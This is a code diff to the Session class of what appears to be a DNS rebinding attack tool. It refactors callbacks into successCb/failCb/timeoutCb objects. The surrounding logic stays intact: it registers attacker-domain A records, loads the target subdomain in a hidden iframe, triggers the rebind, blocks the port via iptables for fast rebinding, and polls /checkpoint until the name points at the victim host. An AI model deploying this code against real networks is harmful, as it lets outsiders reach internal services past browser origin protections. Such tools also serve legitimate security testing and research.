@@ -41,19 +41,23 @@ export default class Session {
       script: script || window.env.script,
       fastRebind: fastRebind,
       args: args
-    }, () => {
-      network.postJSON(this.baseURL + '/arecords', {
-        domain: target + '.' + window.env.domain,
-        address: address,
-        port: port,
-        dual: fastRebind
-      }, () => {
-        // create the iframe
-        const ifrm = document.createElement('iframe')
-        ifrm.setAttribute('src', 'http://' + target + '.' + window.env.domain + ':' + port)
-        ifrm.style.display = 'none'
-        document.body.appendChild(ifrm)
-      })
+    }, {
+      successCb: () => {
+        network.postJSON(this.baseURL + '/arecords', {
+          domain: target + '.' + window.env.domain,
+          address: address,
+          port: port,
+          dual: fastRebind
+        }, {
+          successCb: () => {
+            // create the iframe
+            const ifrm = document.createElement('iframe')
+            ifrm.setAttribute('src', 'http://' + target + '.' + window.env.domain + ':' + port)
+            ifrm.style.display = 'none'
+            document.body.appendChild(ifrm)
+          }
+        })
+      }
     })
   }
 
@@ -63,41 +67,47 @@ export default class Session {
       network.postJSON(this.baseURL + '/arecords', {
         domain: window.env.target + '.' + window.env.domain,
         rebind: true
-      }, () => {
-        // block this port if we're doing fastRebind
-        if (window.env.fastRebind) {
-          network.postJSON(this.baseURL + '/iptables', {
-            port: this.sessionPort,
-            block: true
-          })
+      }, {
+        successCb: () => {
+          // block this port if we're doing fastRebind
+          if (window.env.fastRebind) {
+            network.postJSON(this.baseURL + '/iptables', {
+              port: this.sessionPort,
+              block: true
+            })
+          }
         }
       })
 
       // wait for rebinding to occur
       const wait = (time) => {
-        network.get(this.baseURL + '/checkpoint', function () {
-          // success callback
-          // if we're still getting a 200 OK on /checkpoint it means we're
-          // doing slow-rebind and we've not yet rebinded
-          window.setTimeout(() => {
-            wait(time)
-          }, time)
-        }, function (code) {
-          // fail callback
-
-          // if we get an error code of 0 it means we're using fast-rebind
-          // and we've not yet rebinded
-          if (code === 0) {
+        network.get(this.baseURL + '/checkpoint', {
+          successCb: function () {
+            // success callback
+            // if we're still getting a 200 OK on /checkpoint it means we're
+            // doing slow-rebind and we've not yet rebinded
             window.setTimeout(() => {
               wait(time)
             }, time)
-          } else {
-          // if we're getting another error it means we've rebinded
-          // (ie: the test path /checkpoint doesn't exist on the host)
-            resolve()
+          },
+          failCb: function (code) {
+            // fail callback
+
+            // if we get an error code of 0 it means we're using fast-rebind
+            // and we've not yet rebinded
+            if (code === 0) {
+              window.setTimeout(() => {
+                wait(time)
+              }, time)
+            } else {
+            // if we're getting another error it means we've rebinded
+            // (ie: the test path /checkpoint doesn't exist on the host)
+              resolve()
+            }
+          },
+          timeoutCb: function () {
+            // timeout callback
           }
-        }, function () {
-          // timeout callback
         })
       }
       wait(1000)
